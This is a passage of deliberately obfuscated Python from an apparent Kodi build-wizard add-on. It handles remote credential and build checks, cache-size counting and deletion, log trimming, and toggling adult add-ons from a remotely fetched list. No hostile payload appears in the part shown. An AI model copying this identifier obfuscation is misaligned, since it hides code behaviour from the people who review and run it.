      O000O0O0000OOO0O0 =OOOO0OO0O0O0O0O0O #line:453
    O00OO0OOOO0O00OO0 =urllib2 .urlopen (OO00OOO00OOO0OOOO )#line:454
    O0OOO000O00O0O000 =O00OO0OOOO0O00OO0 .readlines ()#line:455
    OOOOOOO0000OOO0OO =0 #line:456
    for O00O0O0O0OOO0O0O0 in O0OOO000O00O0O000 :#line:457
        if O00O0O0O0OOO0O0O0 .split (' ==')[0 ]==OO00OO0O000O00OO0 or O00O0O0O0OOO0O0O0 .split ()[0 ]==OO00OO0O000O00OO0 :#line:458
            OOOOOOO0000OOO0OO =1 #line:459
            break #line:460
    if OOOOOOO0000OOO0OO ==0 :#line:461
        OOO000O00000OO0O0 =DIALOG .yesno ("%s"%ADDON .getLocalizedString (32001 ),ADDON .getLocalizedString (32002 ),ADDON .getLocalizedString (32003 ),nolabel =ADDON .getLocalizedString (32004 ),yeslabel =ADDON .getLocalizedString (32005 ))#line:462
        LogNotify ("[COLOR %s]%s[/COLOR]"%('yellow',ADDON .getLocalizedString (32006 )),'[COLOR %s]https://t.me/kodi17[/COLOR]'%COLOR2 )#line:463
        if BUILDNAME =="":#line:464
            xbmc .executebuiltin ("ActivateWindow(home)")#line:465
        tryinstall ()#line:466
        if OOO000O00000OO0O0 :#line:467
            ADDON .openSettings ()#line:468
            sys .exit ()#line:469
        else :#line:470
            sys .exit ()#line:471
    OOO00OO0000O000OO =(ADDON .getSetting ("pass"))#line:472
    O00OO0OOOO0O00OO0 =urllib2 .urlopen (O000O0O0000OOO0O0 )#line:473
    O0O00OO0O0O0OO000 =O00OO0OOOO0O00OO0 .readlines ()#line:474
    O000O0OOOO000O00O =0 #line:475
    for O00O0O0O0OOO0O0O0 in O0O00OO0O0O0OO000 :#line:476
        if O00O0O0O0OOO0O0O0 .split (' ==')[0 ]==OOO00OO0000O000OO or O00O0O0O0OOO0O0O0 .split ()[0 ]==OOO00OO0000O000OO :#line:477
            O000O0OOOO000O00O =1 #line:478
            break #line:479
    if O000O0OOOO000O00O ==0 :#line:480
        OOO000O00000OO0O0 =DIALOG .yesno ("%s"%ADDON .getLocalizedString (32007 ),ADDON .getLocalizedString (32008 ),ADDON .getLocalizedString (32009 ),nolabel =ADDON .getLocalizedString (32004 ),yeslabel =ADDON .getLocalizedString (32010 ))#line:481
        LogNotify ("[COLOR %s]%s[/COLOR]"%('yellow',ADDON .getLocalizedString (32006 )),'[COLOR %s]https://t.me/kodi17[/COLOR]'%COLOR2 )#line:482
        if BUILDNAME =="":#line:483
            xbmc .executebuiltin ("ActivateWindow(home)")#line:484
        tryinstall ()#line:485
        if OOO000O00000OO0O0 :#line:486
            ADDON .openSettings ()#line:487
            sys .exit ()#line:488
        else :#line:489
            sys .exit ()#line:490
    return 'ok'#line:491
def checkWizard (OOO0OOO0O0O00OO00 ):#line:492
	if not workingURL (WIZARDFILE )==True :return False #line:493
	OO00O0OOO0OOOOO00 =openURL (WIZARDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:494
	O000O0O0O0O00OO0O =re .compile ('id="%s".+?ersion="(.+?)".+?ip="(.+?)"'%ADDON_ID ).findall (OO00O0OOO0OOOOO00 )#line:495
	if len (O000O0O0O0O00OO0O )>0 :#line:496
		for O00O00O0OO00O00O0 ,O0000OO0O00OOO0O0 in O000O0O0O0O00OO0O :#line:497
			if OOO0OOO0O0O00OO00 =='version':return O00O00O0OO00O00O0 #line:498
			elif OOO0OOO0O0O00OO00 =='zip':return O0000OO0O00OOO0O0 #line:499
			elif OOO0OOO0O0O00OO00 =='all':return ADDON_ID ,O00O00O0OO00O00O0 ,O0000OO0O00OOO0O0 #line:500
	else :return False #line:501
def buildCount (ver =None ):#line:503
	OOO0OO00O0O0O000O =openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:504
	O0OOO0000OO000OOO =re .compile ('name="(.+?)".+?odi="(.+?)".+?dult="(.+?)"').findall (OOO0OO00O0O0O000O )#line:505
	OO0OO00O0OOOO0000 =0 ;O0OOOOO0OO00000OO =0 ;OOO0OO00O0O00OOO0 =0 ;O0O000OO0O00O0O00 =0 ;OO0000000OOO0O0O0 =0 ;OOO0000O0O000OO0O =0 ;O0O00000O00000OO0 =0 #line:506
	if len (O0OOO0000OO000OOO )>0 :#line:507
		for OO0000O000OOO0OOO ,OOOO0OO0OO0O00O0O ,O00OOO000OOOO00O0 in O0OOO0000OO000OOO :#line:508
			if not SHOWADULT =='true'and O00OOO000OOOO00O0 .lower ()=='yes':OOO0000O0O000OO0O +=1 ;O0O00000O00000OO0 +=1 ;continue #line:509
			if not DEVELOPER =='true'and strTest (OO0000O000OOO0OOO ):OOO0000O0O000OO0O +=1 ;continue #line:510
			OOOO0OO0OO0O00O0O =int (float (OOOO0OO0OO0O00O0O ))#line:511
			OO0OO00O0OOOO0000 +=1 #line:512
			if OOOO0OO0OO0O00O0O ==18 :OO0000000OOO0O0O0 +=1 #line:513
			elif OOOO0OO0OO0O00O0O ==17 :O0O000OO0O00O0O00 +=1 #line:514
			elif OOOO0OO0OO0O00O0O ==16 :OOO0OO00O0O00OOO0 +=1 #line:515
			elif OOOO0OO0OO0O00O0O <=15 :O0OOOOO0OO00000OO +=1 #line:516
	return OO0OO00O0OOOO0000 ,O0OOOOO0OO00000OO ,OOO0OO00O0O00OOO0 ,O0O000OO0O00O0O00 ,OO0000000OOO0O0O0 ,O0O00000O00000OO0 ,OOO0000O0O000OO0O #line:517
def strTest (O0OO00O0O0000OO00 ):#line:519
	OOOO00O0OOOOO0000 =(O0OO00O0O0000OO00 .lower ()).split (' ')#line:520
	if 'test'in OOOO00O0OOOOO0000 :return True #line:521
	else :return False #line:522
def themeCount (OOO0O00O000OO00O0 ,count =True ):#line:524
	O000OO0O00O0OO0O0 =checkBuild (OOO0O00O000OO00O0 ,'theme')#line:525
	if O000OO0O00O0OO0O0 =='http://':return False #line:526
	OOO0OO0OO0O000OOO =openURL (O000OO0O00O0OO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:527
	OOO0O0000O0O000OO =re .compile ('name="(.+?)".+?dult="(.+?)"').findall (OOO0OO0OO0O000OOO )#line:528
	if len (OOO0O0000O0O000OO )==0 :return False #line:529
	OOOOO0000OO00OOO0 =[]#line:530
	for OOO0O00O00O00000O ,O000O0OOOOO0OOOO0 in OOO0O0000O0O000OO :#line:531
		if not SHOWADULT =='true'and O000O0OOOOO0OOOO0 .lower ()=='yes':continue #line:532
		OOOOO0000OO00OOO0 .append (OOO0O00O00O00000O )#line:533
	if len (OOOOO0000OO00OOO0 )>0 :#line:534
		if count ==True :return len (OOOOO0000OO00OOO0 )#line:535
		else :return OOOOO0000OO00OOO0 #line:536
	else :return False #line:537
def thirdParty (url =None ):#line:539
	if url ==None :return #line:540
	OOOO0000O000OOO00 =openURL (url ).replace ('\n','').replace ('\r','').replace ('\t','')#line:541
	OOO0OOO0000O0O00O =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?odi="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOO0000O000OOO00 )#line:542
	OOO00OOOOO0O0OO0O =re .compile ('name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OOOO0000O000OOO00 )#line:543
	if len (OOO0OOO0000O0O00O )>0 :#line:544
		return True ,OOO0OOO0000O0O00O #line:545
	elif len (OOO00OOOOO0O0OO0O )>0 :#line:546
		return False ,OOO00OOOOO0O0OO0O #line:547
	else :#line:548
		return False ,[]#line:549
def workingURL (O0000O0000O000OO0 ):#line:555
	if O0000O0000O000OO0 in ['http://','https://','']:return False #line:556
	O0OOOOO00OOO000O0 =0 ;OOOOOO0O0OO000OO0 =''#line:557
	while O0OOOOO00OOO000O0 <3 :#line:558
		O0OOOOO00OOO000O0 +=1 #line:559
		try :#line:560
			OO0O0OO00OO00OOOO =urllib2 .Request (O0000O0000O000OO0 )#line:561
			OO0O0OO00OO00OOOO .add_header ('User-Agent',USER_AGENT )#line:562
			O0OO000OOOO000O00 =urllib2 .urlopen (OO0O0OO00OO00OOOO )#line:563
			O0OO000OOOO000O00 .close ()#line:564
			OOOOOO0O0OO000OO0 =True #line:565
			break #line:566
		except Exception as O00O0O0000O00OO00 :#line:567
			OOOOOO0O0OO000OO0 =str (O00O0O0000O00OO00 )#line:568
			log ("Working Url Error: %s [%s]"%(O00O0O0000O00OO00 ,O0000O0000O000OO0 ))#line:569
			xbmc .sleep (500 )#line:570
	return OOOOOO0O0OO000OO0 #line:571
def openURL (O000O000OOOO0O00O ):#line:573
	O0O000O0O0O0O0OO0 =urllib2 .Request (O000O000OOOO0O00O )#line:574
	O0O000O0O0O0O0OO0 .add_header ('User-Agent',USER_AGENT )#line:575
	O0000000OOOO000O0 =urllib2 .urlopen (O0O000O0O0O0O0OO0 )#line:576
	OOOO0O00000OO00OO =O0000000OOOO000O0 .read ()#line:577
	O0000000OOOO000O0 .close ()#line:578
	return OOOO0O00000OO00OO #line:579
def getKeyboard (default ="",heading ="",hidden =False ):#line:585
	OOO000O0OOOO000O0 =xbmc .Keyboard (default ,heading ,hidden )#line:586
	OOO000O0OOOO000O0 .doModal ()#line:587
	if OOO000O0OOOO000O0 .isConfirmed ():#line:588
		return unicode (OOO000O0OOOO000O0 .getText (),"utf-8")#line:589
	return default #line:590
def getSize (O00O00OO0O0O0OOOO ,total =0 ):#line:592
	for O00000OO0O0OO0000 ,OO0OOO0O0OOO0O0O0 ,O0000O000O000OOOO in os .walk (O00O00OO0O0O0OOOO ):#line:593
		for OO0O00OOO000OOO0O in O0000O000O000OOOO :#line:594
			OO00O0O0O00OO000O =os .path .join (O00000OO0O0OO0000 ,OO0O00OOO000OOO0O )#line:595
			total +=os .path .getsize (OO00O0O0O00OO000O )#line:596
	return total #line:597
def convertSize (O000O0OOO0OO00O0O ,suffix ='B'):#line:599
	for OOOO00O0OO00O00O0 in ['','K','M','G']:#line:600
		if abs (O000O0OOO0OO00O0O )<1024.0 :#line:601
			return "%3.02f %s%s"%(O000O0OOO0OO00O0O ,OOOO00O0OO00O00O0 ,suffix )#line:602
		O000O0OOO0OO00O0O /=1024.0 #line:603
	return "%.02f %s%s"%(O000O0OOO0OO00O0O ,'G',suffix )#line:604
def getCacheSize ():#line:606
	O000O000O0O0OO000 =os .path .join (PROFILE ,'addon_data')#line:607
	O0O000O0OOOOOOO0O =[(os .path .join (ADDONDATA ,'plugin.video.HebDub.movies','database.db')),(os .path .join (ADDONDATA ,'plugin.video.bob','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.specto','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db')),(os .path .join (DATABASE ,'onechannelcache.db')),(os .path .join (DATABASE ,'saltscache.db')),(os .path .join (DATABASE ,'saltshd.lite.db'))]#line:616
	O000OO00OO000OOO0 =[(O000O000O0O0OO000 ),(ADDONDATA ),(os .path .join (HOME ,'cache')),(os .path .join (HOME ,'temp')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','Other')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','LocalAndRental')),(os .path .join (ADDONDATA ,'script.module.simple.downloader')),(os .path .join (ADDONDATA ,'plugin.video.itv','Images')),(os .path .join (O000O000O0O0OO000 ,'script.module.simple.downloader')),(os .path .join (O000O000O0O0OO000 ,'plugin.video.itv','Images'))]#line:627
	OOOO0OOO000O0OOO0 =0 #line:629
	for OO00OO0OO0OO0OO00 in O000OO00OO000OOO0 :#line:631
		if os .path .exists (OO00OO0OO0OO0OO00 )and not OO00OO0OO0OO0OO00 in [ADDONDATA ,O000O000O0O0OO000 ]:#line:632
			OOOO0OOO000O0OOO0 =getSize (OO00OO0OO0OO0OO00 ,OOOO0OOO000O0OOO0 )#line:633
		else :#line:634
			for OOO000O0OO0O0OO0O ,O0O0OOOO000OOO00O ,OOOOO0OOO0O00O000 in os .walk (OO00OO0OO0OO0OO00 ):#line:635
				for O0OOOOOOOO000O000 in O0O0OOOO000OOO00O :#line:636
					if 'cache'in O0OOOOOOOO000O000 .lower ()and not O0OOOOOOOO000O000 .lower ()=='meta_cache':OOOO0OOO000O0OOO0 =getSize (os .path .join (OOO000O0OO0O0OO0O ,O0OOOOOOOO000O000 ),OOOO0OOO000O0OOO0 )#line:637
	if INCLUDEVIDEO =='true':#line:639
		OOOOO0OOO0O00O000 =[]#line:640
		if INCLUDEALL =='true':OOOOO0OOO0O00O000 =O0O000O0OOOOOOO0O #line:641
		else :#line:642
			if INCLUDEBOB =='true':OOOOO0OOO0O00O000 .append (os .path .join (ADDONDATA ,'plugin.video.bob','cache.db'))#line:643
			if INCLUDEPHOENIX =='true':OOOOO0OOO0O00O000 .append (os .path .join (ADDONDATA ,'plugin.video.phstreams','cache.db'))#line:644
			if INCLUDESPECTO =='true':OOOOO0OOO0O00O000 .append (os .path .join (ADDONDATA ,'plugin.video.specto','cache.db'))#line:645
			if INCLUDEGENESIS =='true':OOOOO0OOO0O00O000 .append (os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db'))#line:646
			if INCLUDEEXODUS =='true':OOOOO0OOO0O00O000 .append (os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db'))#line:647
			if INCLUDEONECHAN =='true':OOOOO0OOO0O00O000 .append (os .path .join (DATABASE ,'onechannelcache.db'))#line:648
			if INCLUDESALTS =='true':OOOOO0OOO0O00O000 .append (os .path .join (DATABASE ,'saltscache.db'))#line:649
			if INCLUDESALTSHD =='true':OOOOO0OOO0O00O000 .append (os .path .join (DATABASE ,'saltshd.lite.db'))#line:650
		if len (OOOOO0OOO0O00O000 )>0 :#line:651
			for OO00OO0OO0OO0OO00 in OOOOO0OOO0O00O000 :OOOO0OOO000O0OOO0 =getSize (OO00OO0OO0OO0OO00 ,OOOO0OOO000O0OOO0 )#line:652
		else :log ("Clear Cache: Clear Video Cache Not Enabled",xbmc .LOGNOTICE )#line:653
	return OOOO0OOO000O0OOO0 #line:654
def getInfo (OOOO0O0OO00000OOO ):#line:656
	try :return xbmc .getInfoLabel (OOOO0O0OO00000OOO )#line:657
	except :return False #line:658
def removeFolder (O00000OO0000000OO ):#line:660
	log ("Deleting Folder: %s"%O00000OO0000000OO ,xbmc .LOGNOTICE )#line:661
	try :shutil .rmtree (O00000OO0000000OO ,ignore_errors =True ,onerror =None )#line:662
	except :return False #line:663
def removeFile (O0OO0O0OO00OO00O0 ):#line:665
	log ("Deleting File: %s"%O0OO0O0OO00OO00O0 ,xbmc .LOGNOTICE )#line:666
	try :os .remove (O0OO0O0OO00OO00O0 )#line:667
	except :return False #line:668
def currSkin ():#line:670
	return xbmc .getSkinDir ()#line:671
def cleanHouse (OOOOOO000OO0OOO0O ,ignore =False ):#line:673
	log (OOOOOO000OO0OOO0O )#line:674
	O0O0000O000OOOOO0 =0 ;OOO0OOO0O00OOO0O0 =0 #line:675
	for OO00000OOO00OOOOO ,OOO0O00O0O0OO000O ,OOO00OO0OOOO00O0O in os .walk (OOOOOO000OO0OOO0O ):#line:676
		if ignore ==False :OOO0O00O0O0OO000O [:]=[O00OOOO0OOOOOO000 for O00OOOO0OOOOOO000 in OOO0O00O0O0OO000O if O00OOOO0OOOOOO000 not in EXCLUDES ]#line:677
		O00O0O0O00OO0OO0O =0 #line:678
		O00O0O0O00OO0OO0O +=len (OOO00OO0OOOO00O0O )#line:679
		if O00O0O0O00OO0OO0O >=0 :#line:680
			for O00OO0OO00O0OO0O0 in OOO00OO0OOOO00O0O :#line:681
				try :#line:682
					os .unlink (os .path .join (OO00000OOO00OOOOO ,O00OO0OO00O0OO0O0 ))#line:683
					O0O0000O000OOOOO0 +=1 #line:684
				except :#line:685
					try :#line:686
						shutil .rmtree (os .path .join (OO00000OOO00OOOOO ,O00OO0OO00O0OO0O0 ))#line:687
					except :#line:688
						log ("Error Deleting %s"%O00OO0OO00O0OO0O0 ,xbmc .LOGERROR )#line:689
			for OOO0OO000O0O00O0O in OOO0O00O0O0OO000O :#line:690
				OOO0OOO0O00OOO0O0 +=1 #line:691
				try :#line:692
					shutil .rmtree (os .path .join (OO00000OOO00OOOOO ,OOO0OO000O0O00O0O ))#line:693
					OOO0OOO0O00OOO0O0 +=1 #line:694
				except :#line:695
					log ("Error Deleting %s"%OOO0OO000O0O00O0O ,xbmc .LOGERROR )#line:696
	return O0O0000O000OOOOO0 ,OOO0OOO0O00OOO0O0 #line:697
def emptyfolder (O0O00O00O0O0O00OO ):#line:699
	O000OOOO00O0OO0OO =0 #line:700
	for OOOO00OOO0OO00OOO ,OOOO00O000O00O0OO ,O000000O0O0O0O000 in os .walk (O0O00O00O0O0O00OO ,topdown =True ):#line:701
		OOOO00O000O00O0OO [:]=[O00OOOO00O0OOO000 for O00OOOO00O0OOO000 in OOOO00O000O00O0OO if O00OOOO00O0OOO000 not in EXCLUDES ]#line:702
		OO00O0O00OOO00OO0 =0 #line:703
		OO00O0O00OOO00OO0 +=len (O000000O0O0O0O000 )+len (OOOO00O000O00O0OO )#line:704
		if OO00O0O00OOO00OO0 ==0 :#line:705
			shutil .rmtree (os .path .join (OOOO00OOO0OO00OOO ))#line:706
			O000OOOO00O0OO0OO +=1 #line:707
			log ("Empty Folder: %s"%OOOO00OOO0OO00OOO ,xbmc .LOGNOTICE )#line:708
	return O000OOOO00O0OO0OO #line:709
def log (O00OOO0OO0OO0O00O ,level =xbmc .LOGDEBUG ):#line:711
	if not os .path .exists (ADDONDATA ):os .makedirs (ADDONDATA )#line:712
	if not os .path .exists (WIZLOG ):O0O00O00OOO0000O0 =open (WIZLOG ,'w');O0O00O00OOO0000O0 .close ()#line:713
	if WIZDEBUGGING =='false':return False #line:714
	if DEBUGLEVEL =='0':return False #line:715
	if DEBUGLEVEL =='1'and not level in [xbmc .LOGNOTICE ,xbmc .LOGERROR ,xbmc .LOGSEVERE ,xbmc .LOGFATAL ]:return False #line:716
	if DEBUGLEVEL =='2':level =xbmc .LOGNOTICE #line:717
	try :#line:718
		if isinstance (O00OOO0OO0OO0O00O ,unicode ):#line:719
			O00OOO0OO0OO0O00O ='%s'%(O00OOO0OO0OO0O00O .encode ('utf-8'))#line:720
		xbmc .log ('%s: %s'%(ADDONTITLE ,O00OOO0OO0OO0O00O ),level )#line:721
	except Exception as OOO000O00OOOO000O :#line:722
		try :xbmc .log ('Logging Failure: %s'%(OOO000O00OOOO000O ),level )#line:723
		except :pass #line:724
	if ENABLEWIZLOG =='true':#line:725
		O0O00O00O0O0O0000 =getS ('nextcleandate')if not getS ('nextcleandate')==''else str (TODAY )#line:726
		if CLEANWIZLOG =='true'and O0O00O00O0O0O0000 <=str (TODAY ):checkLog ()#line:727
		with open (WIZLOG ,'a')as O0O00O00OOO0000O0 :#line:728
			O0O00000OOO0O0OO0 ="[%s %s] %s"%(datetime .now ().date (),str (datetime .now ().time ())[:8 ],O00OOO0OO0OO0O00O )#line:729
			O0O00O00OOO0000O0 .write (O0O00000OOO0O0OO0 .rstrip ('\r\n')+'\n')#line:730
def checkLog ():#line:732
	OOO0OOO0OO0OOOOOO =getS ('nextcleandate')#line:733
	O00OOOO000OO00O00 =TOMORROW #line:734
	if CLEANWIZLOGBY =='0':#line:735
		OO000OO0O00O00O0O =TODAY -timedelta (days =MAXWIZDATES [int (float (CLEANDAYS ))])#line:736
		OOO00O0OOOO0O0OO0 =0 #line:737
		OOOOOOO0000O00OO0 =open (WIZLOG );OO0O00O0O0OOOO00O =OOOOOOO0000O00OO0 .read ();OOOOOOO0000O00OO0 .close ();OOOO00OO0000O0000 =OO0O00O0O0OOOO00O .split ('\n')#line:738
		for O0OOO0O0O00O00O0O in OOOO00OO0000O0000 :#line:739
			if str (O0OOO0O0O00O00O0O [1 :11 ])>=str (OO000OO0O00O00O0O ):#line:740
				break #line:741
			OOO00O0OOOO0O0OO0 +=1 #line:742
		OO0O000OO0OOO0000 =OOOO00OO0000O0000 [OOO00O0OOOO0O0OO0 :]#line:743
		OOOO0O0OO0O000O00 ='\n'.join (OO0O000OO0OOO0000 )#line:744
		OOOOOOO0000O00OO0 =open (WIZLOG ,'w');OOOOOOO0000O00OO0 .write (OOOO0O0OO0O000O00 );OOOOOOO0000O00OO0 .close ()#line:745
	elif CLEANWIZLOGBY =='1':#line:746
		O00O00000OOOOO000 =MAXWIZSIZE [int (float (CLEANSIZE ))]*1024 #line:747
		OOOOOOO0000O00OO0 =open (WIZLOG );OO0O00O0O0OOOO00O =OOOOOOO0000O00OO0 .read ();OOOOOOO0000O00OO0 .close ();OOOO00OO0000O0000 =OO0O00O0O0OOOO00O .split ('\n')#line:748
		if os .path .getsize (WIZLOG )>=O00O00000OOOOO000 :#line:749
			OOOOOO0OOOO000OOO =len (OOOO00OO0000O0000 )/2 #line:750
			OO0O000OO0OOO0000 =OOOO00OO0000O0000 [OOOOOO0OOOO000OOO :]#line:751
			OOOO0O0OO0O000O00 ='\n'.join (OO0O000OO0OOO0000 )#line:752
			OOOOOOO0000O00OO0 =open (WIZLOG ,'w');OOOOOOO0000O00OO0 .write (OOOO0O0OO0O000O00 );OOOOOOO0000O00OO0 .close ()#line:753
	elif CLEANWIZLOGBY =='2':#line:754
		OOOOOOO0000O00OO0 =open (WIZLOG );OO0O00O0O0OOOO00O =OOOOOOO0000O00OO0 .read ();OOOOOOO0000O00OO0 .close ();OOOO00OO0000O0000 =OO0O00O0O0OOOO00O .split ('\n')#line:755
		OOOOO0OOO000O00O0 =MAXWIZLINES [int (float (CLEANLINES ))]#line:756
		if len (OOOO00OO0000O0000 )>OOOOO0OOO000O00O0 :#line:757
			OOOOOO0OOOO000OOO =len (OOOO00OO0000O0000 )-int (OOOOO0OOO000O00O0 /2 )#line:758
			OO0O000OO0OOO0000 =OOOO00OO0000O0000 [OOOOOO0OOOO000OOO :]#line:759
			OOOO0O0OO0O000O00 ='\n'.join (OO0O000OO0OOO0000 )#line:760
			OOOOOOO0000O00OO0 =open (WIZLOG ,'w');OOOOOOO0000O00OO0 .write (OOOO0O0OO0O000O00 );OOOOOOO0000O00OO0 .close ()#line:761
	setS ('nextcleandate',str (O00OOOO000OO00O00 ))#line:762
def latestDB (OOO0O0O0OO00OO0OO ):#line:764
	if OOO0O0O0OO00OO0OO in ['Addons','ADSP','Epg','MyMusic','MyVideos','Textures','TV','ViewModes']:#line:765
		O0O0OOOOO0O00000O =glob .glob (os .path .join (DATABASE ,'%s*.db'%OOO0O0O0OO00OO0OO ))#line:766
		O0O00OO0O0O0O00OO ='%s(.+?).db'%OOO0O0O0OO00OO0OO [1 :]#line:767
		O000O00000O00OO0O =0 #line:768
		for O000OO000OOOOO00O in O0O0OOOOO0O00000O :#line:769
			try :O0OO0OOOO0OOOO0OO =int (re .compile (O0O00OO0O0O0O00OO ).findall (O000OO000OOOOO00O )[0 ])#line:770
			except :O0OO0OOOO0OOOO0OO =0 #line:771
			if O000O00000O00OO0O <O0OO0OOOO0OOOO0OO :#line:772
				O000O00000O00OO0O =O0OO0OOOO0OOOO0OO #line:773
		return '%s%s.db'%(OOO0O0O0OO00OO0OO ,O000O00000O00OO0O )#line:774
	else :return False #line:775
def addonId (O000O0OO0O000OOOO ):#line:777
	try :#line:778
		return xbmcaddon .Addon (id =O000O0OO0O000OOOO )#line:779
	except :#line:780
		return False #line:781
def toggleDependency (O0O00O0OOO000O000 ,DP =None ):#line:783
	O0O0O00OO0OOO00O0 =os .path .join (ADDONS ,O0O00O0OOO000O000 ,'addon.xml')#line:784
	if os .path .exists (O0O0O00OO0OOO00O0 ):#line:785
		O00OO00000O0O00OO =open (O0O0O00OO0OOO00O0 ,mode ='r');OOOO000OO0000OO0O =O00OO00000O0O00OO .read ();O00OO00000O0O00OO .close ();#line:786
		O0O000O00O0000000 =parseDOM (OOOO000OO0000OO0O ,'import',ret ='addon')#line:787
		for OO0OOOO00O00OOOO0 in O0O000O00O0000000 :#line:788
			if not 'xbmc.python'in OO0OOOO00O00OOOO0 :#line:789
				O00OO0O0O00O00OO0 =os .path .join (ADDONS ,OO0OOOO00O00OOOO0 )#line:790
				if not DP ==None :#line:791
					DP .update ("","Checking Dependency [COLOR yellow]%s[/COLOR] for [COLOR yellow]%s[/COLOR]"%(OO0OOOO00O00OOOO0 ,O0O00O0OOO000O000 ),"")#line:792
				if os .path .exists (O00OO0O0O00O00OO0 ):#line:793
					toggleAddon (O0O00O0OOO000O000 ,'true')#line:794
			xbmc .sleep (100 )#line:795
def toggleAdult ():#line:797
	OOOO00O00O0OO0O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Enable[/COLOR] or [COLOR %s]Disable[/COLOR] all Adult addons?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Enable[/COLOR][/B]",nolabel ="[B][COLOR red]Disable[/COLOR][/B]")#line:798
	O0OOO00O00O0O0OOO ='true'if OOOO00O00O0OO0O00 ==1 else 'false'#line:799
	OOOO0O0O0O000OOOO ='Enabling'if OOOO00O00O0OO0O00 ==1 else 'Disabling'#line:800
	OO00O0OO0OOOO0OOO =openURL ('http://noobsandnerds.com/TI/AddonPortal/adult.php').replace ('\n','').replace ('\r','').replace ('\t','')#line:801
	OOOOO0O0O00OO00O0 =re .compile ('i="(.+?)"').findall (OO00O0OO0OOOO0OOO )#line:802
	O0000OO0OOO0OO0O0 =[]#line:803
	for O00O00O0OO000O0OO in OOOOO0O0O00OO00O0 :#line:804
		OO00OO00OO0OOO000 =os .path .join (ADDONS ,O00O00O0OO000O0OO )#line:805
		if os .path .exists (OO00OO00OO0OOO000 ):#line:806
			O0000OO0OOO0OO0O0 .append (O00O00O0OO000O0OO )#line:807
			toggleAddon (O00O00O0OO000O0OO ,O0OOO00O00O0O0OOO ,True )#line:808
			log ("[Toggle Adult] %s %s"%(OOOO0O0O0O000OOOO ,O00O00O0OO000O0OO ),xbmc .LOGNOTICE )#line:809
	if len (O0000OO0OOO0OO0O0 )>0 :#line:810
		if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to view a list of the addons that where %s?[/COLOR]"%(COLOR2 ,OOOO0O0O0O000OOOO .replace ('ing','ed')),yeslabel ="[B][COLOR green]View List[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]"):#line:811
			O00OOO0O000OO00O0 ='[CR]'.join (O0000OO0OOO0OO0O0 )#line:812
			TextBox (ADDONTITLE ,"[COLOR %s]Here are a list of the addons that where %s for Adult Content:[/COLOR][CR][CR][COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0O0O0O000OOOO .replace ('ing','ed'),COLOR2 ,O00OOO0O000OO00O0 ))#line:813
		else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s][COLOR %s]%d[/COLOR] Adult Addons %s[/COLOR]"%(COLOR2 ,COLOR1 ,count ,OOOO0O0O0O000OOOO .replace ('ing','ed')))#line:814
		forceUpdate (True )#line:815
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Adult Addons Found[/COLOR]"%COLOR2 )#line:816
def createTemp (OOO000OO0OOO00OOO ):#line:818
	O000OOOOOO00OOOO0 =os .path .join (PLUGIN ,'resources','tempaddon.xml')#line:819
	OO00O0O0000000O0O =open (O000OOOOOO00OOOO0 ,'r');OO0O0O000OOO0O00O =OO00O0O0000000O0O .read ();OO00O0O0000000O0O .close ()#line:820
	O0OOO00OO0OOOO000 =os .path .join (ADDONS ,OOO000OO0OOO00OOO )#line:821
	if not os .path .exists (O0OOO00OO0OOOO000 ):os .makedirs (O0OOO00OO0OOOO000 )#line:822
	OOO00OOOO0OOOOOO0 =open (os .path .join (O0OOO00OO0OOOO000 ,'addon.xml'),'w')#line:823
	OOO00OOOO0OOOOOO0 .write (OO0O0O000OOO0O00O .replace ('testid',OOO000OO0OOO00OOO ).replace ('testversion','0.0.1'))#line:824
	OOO00OOOO0OOOOOO0 .close ()#line:825
	log ("%s: wrote addon.xml"%OOO000OO0OOO00OOO )#line:826
def fixmetas ():#line:828
	OO0O0O00OOO0OO0O0 =['']#line:829
	O00OOOO0OOOOO0O00 =os .path .join (PLUGIN ,'resources','tempaddon.xml')#line:830
	O0O0OO0000O0O00O0 =open (O00OOOO0OOOOO0O00 ,'r');O00O00OOO00OO0OOO =O0O0OO0000O0O00O0 .read ();O0O0OO0000O0O00O0 .close ()#line:831
	for O00OO0000OOOO00OO in OO0O0O00OOO0OO0O0 :#line:832
		O000OOOOOOOOOO0OO =os .path .join (ADDONS ,O00OO0000OOOO00OO )#line:833
		if os .path .exists (O000OOOOOOOOOO0OO ):#line:834
			if not os .path .exists (os .path .join (O000OOOOOOOOOO0OO ,'addon.xml')):continue #line:835
			O00O00OOOOO000OO0 =open (os .path .join (O000OOOOOOOOOO0OO ,'addon.xml'),'w')#line:836
			O00O00OOOOO000OO0 .write (O00O00OOO00OO0OOO .replace ('testid',O00OO0000OOOO00OO ).replace ('testversion','0.0.1'))#line:837
			O00O00OOOOO000OO0 .close ()#line:838
			log ("%s: re-wrote addon.xml"%O00OO0000OOOO00OO )#line:839
def toggleAddon (OO000OOO000O000O0 ,OO0OOOOO0O0000OOO ,over =None ):#line:841
	if KODIV >=17 :#line:842
		addonDatabase (OO000OOO000O000O0 ,OO0OOOOO0O0000OOO )#line:843
		return #line:844
	OOOOOO0O0OO000O0O =OO000OOO000O000O0 #line:845
	OOO000O0O0OOOO00O =os .path .join (ADDONS ,OO000OOO000O000O0 ,'addon.xml')#line:846
